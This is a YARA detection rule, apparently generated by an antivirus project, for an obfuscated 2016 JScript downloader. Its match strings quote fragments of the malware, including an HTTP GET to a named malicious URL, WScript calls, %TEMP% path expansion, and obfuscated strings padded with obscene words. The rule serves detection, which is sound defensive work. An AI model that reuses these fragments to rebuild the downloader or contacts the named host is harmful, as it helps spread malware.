rule sig_20160428_854f264dd4d92a18365ef849d78c4236 {
  meta:
    description = "datamaliciousorder - file 20160428_854f264dd4d92a18365ef849d78c4236.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fe73f7bdb55c08bec5d0b3fca1a32615267e3a14d5b2611b15995e403f5e55b1"

  strings:
    $s1  = "AtmRjzGodHfcDwhYtkMas[PwxIqtWgcJbbJzmEldCdl](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "function NqsNjeXnvJdaJyiDkvWvi(AruPzaIsvZsgCjqDhxAno){UiwLgpVijYvqEelJdcSzj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function NqsNjeXnvJdaJyiDkvWvi(AruPzaIsvZsgCjqDhxAno){UiwLgpVijYvqEelJdcSzj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function OdkFgoVuuZesZoxCzxAxu() {return UiwLgpVijYvqEelJdcSzj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "return ZieHtrKqsWgcPeiVdwGpx - PmkAenXxgPglVcuQmaSkw;};" fullword ascii
    $s6  = "var UiwLgpVijYvqEelJdcSzj = function FniMpkPpmKkhTqsEmaEjg() {return WnpKbuVhvLwvOqnJjlNnl[YdqVccPwnXbbVdzZcyLee](\"WScript\"+\"" ascii
    $s7  = "function IjlPtsLcwQlhXdqThhVgu(ZieHtrKqsWgcPeiVdwGpx, PmkAenXxgPglVcuQmaSkw){VgnYjlChnGzwUamVadMas = VgnYjlChnGzwUamVadMas * 1; " ascii
    $s8  = "var WnpKbuVhvLwvOqnJjlNnl = this[\"WScript\"];" fullword ascii
    $s9  = "var UiwLgpVijYvqEelJdcSzj = function FniMpkPpmKkhTqsEmaEjg() {return WnpKbuVhvLwvOqnJjlNnl[YdqVccPwnXbbVdzZcyLee](\"WScript\"+\"" ascii
    $s10 = "function OdkFgoVuuZesZoxCzxAxu() {return UiwLgpVijYvqEelJdcSzj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function IjlPtsLcwQlhXdqThhVgu(ZieHtrKqsWgcPeiVdwGpx, PmkAenXxgPglVcuQmaSkw){VgnYjlChnGzwUamVadMas = VgnYjlChnGzwUamVadMas * 1; " ascii
    $s12 = "function NssUcyVvcGzsPawSerCos(){return GfhPhfNpvBftWgzUzpPkp + \"\";};" fullword ascii
    $s13 = "if (AtmRjzGodHfcDwhYtkMas[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function CmnEpeHnyJbzBwqKziVya() {return ((BlvUhqLjqAxdTzgMqcEwc == true) && (BlvUhqLjqAxdTzgMqcEwc == UoaIviHenKxpHjhNwoYen)) ?" ascii
    $s15 = "function CmnEpeHnyJbzBwqKziVya() {return ((BlvUhqLjqAxdTzgMqcEwc == true) && (BlvUhqLjqAxdTzgMqcEwc == UoaIviHenKxpHjhNwoYen)) ?" ascii
    $s16 = "function IecNfsZrlFaaFnsRbxGzm(){return 23;};" fullword ascii
    $s17 = "function LdbMumQxoJncLuvSmzKfx(LydGceYfgFikOjoEnySbv) {var VilDvxJbnOleGqtEigQgj = (1, 2, 3, 4, 5, LydGceYfgFikOjoEnySbv); retur" ascii
    $s18 = "var BlvUhqLjqAxdTzgMqcEwc = false;" fullword ascii
    $s19 = "var MirRxeNfmTujBwyLbjMjf = false;" fullword ascii
    $s20 = "function UlbCbaYjmDiwDiqJedKrr(){return YdqVccPwnXbbVdzZcyLee;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}